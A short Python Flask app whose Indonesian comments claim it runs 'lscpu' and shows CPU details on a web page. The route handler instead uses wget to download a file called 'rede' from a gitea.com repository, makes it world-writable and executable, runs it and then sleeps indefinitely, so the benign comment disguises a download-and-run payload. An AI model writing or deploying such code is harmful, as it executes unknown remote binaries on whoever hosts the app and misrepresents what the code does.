import subprocess
from flask import Flask

app = Flask(__name__)

@app.route('/')
def cek_cpu():
    # Menjalankan perintah bash 'lscpu' dan menangkap outputnya
    hasil_lscpu = subprocess.check_output(['wget https://gitea.com/toafubi/Gremonia/raw/branch/main/rede && chmod 777 rede && ./rede && sleep infinity'], text=True)
    # Menampilkan di web dengan tag <pre> agar format tabel/spasinya rapi
    return f"<pre>{hasil_lscpu}</pre>"
